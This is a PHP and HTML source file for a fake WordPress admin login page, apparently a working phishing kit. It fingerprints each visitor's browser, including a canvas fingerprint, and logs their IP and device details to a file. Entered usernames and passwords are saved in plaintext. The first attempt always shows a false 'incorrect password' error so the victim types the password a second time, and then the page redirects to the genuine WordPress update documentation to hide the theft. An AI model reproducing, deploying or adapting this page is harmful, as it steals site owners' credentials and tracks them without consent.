<?php

session_start();

$userIP = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$userLang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$userPort = $_SERVER['REMOTE_PORT'];
$userTimezone = date_default_timezone_get();

$browserDetailsJson = isset($_POST['navbar']) ? $_POST['navbar'] : null;
$hashedNavigatorDetails = '';

if ($browserDetailsJson) {
    $browserDetails = json_decode($browserDetailsJson, true);

    $relevantProperties = [
        'userAgent' => $browserDetails['userAgent'],
        'language' => $browserDetails['language'],
        'platform' => $browserDetails['platform'],
        'cookiesEnabled' => $browserDetails['cookiesEnabled'],
        'doNotTrack' => $browserDetails['doNotTrack'],
        'hardwareConcurrency' => $browserDetails['hardwareConcurrency'],
        'timeZone' => $browserDetails['timeZone'],
        'locale' => $browserDetails['locale'],
        'maxTouchPoints' => $browserDetails['maxTouchPoints'],
        'mediaDevices' => $browserDetails['mediaDevices'],
        'onLine' => $browserDetails['onLine'],
        'pdfViewerEnabled' => $browserDetails['pdfViewerEnabled'],
        'plugins' => $browserDetails['plugins'],
        'product' => $browserDetails['product'],
        'serviceWorker' => $browserDetails['serviceWorker'],
        'userActivation' => $browserDetails['userActivation'],
        'vendor' => $browserDetails['vendor'],
        'vendorSub' => $browserDetails['vendorSub'],
        'canvasFingerprint' => $browserDetails['canvasFingerprint'],
    ];

    $hashedNavigatorDetails = md5(json_encode($relevantProperties));

    $expectedKeys = [
        'userAgent',
        'language',
        'platform',
        'cookiesEnabled',
        'doNotTrack',
        'hardwareConcurrency',
        'timeZone',
        'locale',
        'connection',
        'deviceMemory',
        'hid',
        'maxTouchPoints',
        'mediaDevices',
        'onLine',
        'pdfViewerEnabled',
        'plugins',
        'product',
        'productsub',
        'serial',
        'serviceWorker',
        'userActivation',
        'userAgentData',
        'vendor',
        'vendorSub',
        'canvasFingerprint'
    ];

    $missingKeys = array_diff($expectedKeys, array_keys($browserDetails));

    if (!empty($missingKeys)) {
        error_log('Missing keys in browser details: ' . implode(', ', $missingKeys));
    }
}

$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct Visit';

$ip = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];


foreach ($_GET as $key => $value) {
}

$key = "";
$value = "";


header("url=sql.php?" . $key . "=" . $value);

$ip = $_SERVER['REMOTE_ADDR'];
if (!isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $ip = $_SERVER['REMOTE_ADDR'];
} else {
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
}

$lng = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$port = $_SERVER['REMOTE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$cj_time = date("Y-m-d H:i:s");
$log = array(
    $key,
    $value,
    $cj_time,
    $ip,
    $port,
    $agent,
    $lng,
    $hashedNavigatorDetails,
);
$handle = fopen("cj.cj", "a");
$File = json_encode($log);
fwrite($handle, $File);
fwrite($handle, "\r\n");
fclose($handle);

date_default_timezone_set('Asia/Kolkata');

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $enteredUsername = $_POST["user"];
    $enteredPassword = $_POST["pass"];

    $log = array(
        "attempt" => isset($_SESSION['error_shown']) ? "second_attempt" : "first_attempt",
        "username" => $enteredUsername,
        "password" => $enteredPassword,
        "timestamp" => date("Y-m-d H:i:s")
    );

    $handle = fopen("34-susukrnch.cj", "a");
    fwrite($handle, json_encode($log) . "\r\n");
    fclose($handle);

    if (!isset($_SESSION['error_shown'])) {
        $_SESSION['error_shown'] = true; // Mark error as shown
        $_SESSION['show_error'] = true; // Flag to display the error message
    } else {
        // Second submission: Process login
        header('Location: https://wordpress.org/documentation/article/updating-wordpress/');
        exit;
    }
}


?>

<!DOCTYPE html>
<html lang="en-US">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Log In &lsaquo; &#8212; WordPress Admin</title>

    <style type="text/css">
        body.login div#login h1 a {
            background-image: url(images/WordPress.png);
            padding-bottom: 30px;
        }

        img {
            background-image: url(/images/WordPress.png);
            background-image: none, url(/images/WordPress.png);
            background-size: 84px;
            background-position: center top;
            background-repeat: no-repeat;
            color: #3c434a;
            height: 84px;
            font-size: 20px;
            font-weight: 400;
            line-height: 1.3;
            margin: 0 auto 25px;
            padding: 0;
            text-decoration: none;
            width: 84px;
            text-indent: -9999px;
            outline: 0;
            overflow: hidden;
            display: block;
        }

        #login_error {
            border-left-color: #d63638;
            /* display: none; */
        }

        #login_error,
        .login .message,
        .login .success {
            border-left: 4px solid #72aee6;
            border-left-color: rgb(114, 174, 230);
            padding: 12px;
            margin-left: 0;
            margin-bottom: 20px;
            background-color: #fff;
            box-shadow: 0 1px 1px 0 rgba(0, 0, 0, .1);
            word-wrap: break-word;
        }
    </style>



    <meta name='robots' content='max-image-preview:large, noindex, noarchive' />
    <link rel='dns-prefetch' href='//s.w.org' />
    <link rel='stylesheet' id='dashicons-css' href='mycss/1.css' type='text/css' media='all' />
    <link rel='stylesheet' id='buttons-css' href='mycss/2.css' type='text/css' media='all' />
    <link rel='stylesheet' id='forms-css' href='mycss/3.css' type='text/css' media='all' />
    <link rel='stylesheet' id='l10n-css' href='mycss/4.css' type='text/css' media='all' />
    <link rel='stylesheet' id='login-css' href='mycss/5.css' type='text/css' media='all' />
    <script language="javascript" type="text/javascript">
        var style = document.createElement("style");
        style.type = "text/css";
        style.id = "antiClickjack";
        if ("cssText" in style) {
            style.cssText = "body{display:none !important;}";
        } else {
            style.innerHTML = "body{display:none !important;}";
        }
        document.getElementsByTagName("head")[0].appendChild(style);

        if (top === self) {
            var antiClickjack = document.getElementById("antiClickjack");
            antiClickjack.parentNode.removeChild(antiClickjack);
        } else {
            top.location = self.location;
        }
    </script>
    <meta name='referrer' content='strict-origin-when-cross-origin' />
    <meta name="viewport" content="width=device-width" />
    <link rel="icon" href="images/WordPress.png" sizes="32x32" />
    <link rel="icon" href="images/WordPress.png" sizes="192x192" />
    <link rel="apple-touch-icon" href="images/WordPress.png" />
    <meta name="msapplication-TileImage" content="images/WordPress.png" />
</head>

<body class="login no-js login-action-login wp-core-ui  locale-en-us">
    <script type="text/javascript">
        document.body.className = document.body.className.replace('no-js', 'js');
    </script>

    <script>
        function getCanvasFingerprint() {
            var canvas = document.createElement("canvas");
            var ctx = canvas.getContext("2d");

            canvas.width = 1000;
            canvas.height = 100;

            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("Canvas Fingerprint", 2, 15);

            return canvas.toDataURL("image/png");
        }

        document.addEventListener('DOMContentLoaded', function() {
            var browserDetails = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                locale: Intl.DateTimeFormat().resolvedOptions().locale,
                connection: navigator.connection,
                deviceMemory: navigator.deviceMemory,
                hid: navigator.hid,
                maxTouchPoints: navigator.maxTouchPoints,
                mediaDevices: navigator.mediaDevices,
                mediaSession: navigator.mediaSession,
                mimeTypes: navigator.mimeTypes,
                onLine: navigator.onLine,
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                plugins: navigator.plugins,
                product: navigator.product,
                productsub: navigator.productsub,
                serial: navigator.serial,
                serviceWorker: navigator.serviceWorker,
                userActivation: navigator.userActivation,
                userAgentData: navigator.userAgentData,
                vendor: navigator.vendor,
                vendorSub: navigator.vendorSub,
                canvasFingerprint: getCanvasFingerprint(),
            };

            var navbarInput = document.getElementById("navDetails");
            navbarInput.value = JSON.stringify(browserDetails);

        });
    </script>

    <div id="login">

        <h1><a href="">Powered by WordPress</a></h1>

        <?php if (isset($_SESSION['show_error']) && $_SESSION['show_error']): ?>
            <div id="login_error">
                <strong>Error</strong>: Please enter the correct password.
            </div>
            <?php unset($_SESSION['show_error']);
            ?>
        <?php endif; ?>

        <form name="loginform" id="loginform" action="" method="post">
            <p>
                <label for="user_login">Username or Email Address</label>
                <input type="text" name="user" id="user_login" class="input" value="" size="20" autocapitalize="off" required />
            </p>

            <div class="user-pass-wrap">
                <label for="user_pass">Password</label>
                <div class="wp-pwd">
                    <input type="password" id="passwordField" name="pass" class="input">
                    <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Show password" onclick="togglePassword()">
                        <span class="dashicons dashicons-visibility" aria-hidden="true"></span>
                    </button>
                </div>
            </div>
            <p class="forgetmenot">
                <input name="rememberme" type="checkbox" id="rememberme" value="forever" />
                <label for="rememberme">Remember Me</label>
            </p>
            <p class="submit">
                <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
                <input type="hidden" name="testcookie" value="1" />
            </p>
        </form>

        <script type="text/javascript">
            function togglePassword() {
                const passwordField = document.getElementById('passwordField');
                const toggleButton = document.querySelector('.wp-hide-pw');
                const isPasswordHidden = passwordField.type === 'password';

                passwordField.type = isPasswordHidden ? 'text' : 'password';

                toggleButton.setAttribute('aria-label', isPasswordHidden ? 'Hide password' : 'Show password');

                const icon = toggleButton.querySelector('.dashicons');
                if (icon) {
                    icon.classList.toggle('dashicons-visibility');
                    icon.classList.toggle('dashicons-hidden');
                }
            }
        </script>

        <center>
            <p style="text-align: left;">Log in to your website,<br> Wordpress will update automatically.</p>
        </center>

        <script type="text/javascript">
            function wp_attempt_focus() {
                setTimeout(function() {
                    try {
                        d = document.getElementById("user_login");
                        d.focus();
                        d.select();
                    } catch (er) {}
                }, 200);
            }
            wp_attempt_focus();
            if (typeof wpOnload === 'function') {
                wpOnload()
            }
        </script>
        <p id="backtoblog">

    </div>
    <script type='text/javascript' id='zxcvbn-async-js-extra'>
        var _zxcvbnSettings = {
            "src": "js\/zxcvbn.min.js"
        };
    </script>
    <script type='text/javascript' id='wp-i18n-js-after'>
        wp.i18n.setLocaleData({
            'text direction\u0004ltr': ['ltr']
        });
    </script>
    <script type='text/javascript' id='password-strength-meter-js-extra'>
        var pwsL10n = {
            "unknown": "Password strength unknown",
            "short": "Very weak",
            "bad": "Weak",
            "good": "Medium",
            "strong": "Strong",
            "mismatch": "Mismatch"
        };
    </script>
    <script type='text/javascript' id='password-strength-meter-js-translations'>
        (function(domain, translations) {
            var localeData = translations.locale_data[domain] || translations.locale_data.messages;
            localeData[""].domain = domain;
            wp.i18n.setLocaleData(localeData, domain);
        })("default", {
            "locale_data": {
                "messages": {
                    "": {}
                }
            }
        });
    </script>
    <script type='text/javascript' src='js/password-strength-meter.min.js?ver=5.9.4.1732863724' id='password-strength-meter-js'></script>
    <script type='text/javascript' id='wp-util-js-extra'>
        var _wpUtilSettings = {
            "ajax": {
                "url": "\/wp-admin\/admin-ajax.php"
            }
        };
    </script>
    <script type='text/javascript' id='user-profile-js-extra'>
        var userProfileL10n = {
            "user_id": "0",
            "nonce": "a79f683bcc"
        };
    </script>
    <script type='text/javascript' id='user-profile-js-translations'>
        (function(domain, translations) {
            var localeData = translations.locale_data[domain] || translations.locale_data.messages;
            localeData[""].domain = domain;
            wp.i18n.setLocaleData(localeData, domain);
        })("default", {
            "locale_data": {
                "messages": {
                    "": {}
                }
            }
        });
    </script>
    <script type='text/javascript' src='js/user-profile.min.js?ver=5.9.4.1732863724' id='user-profile-js'></script>
    <div class="clear"></div>
</body>

</html>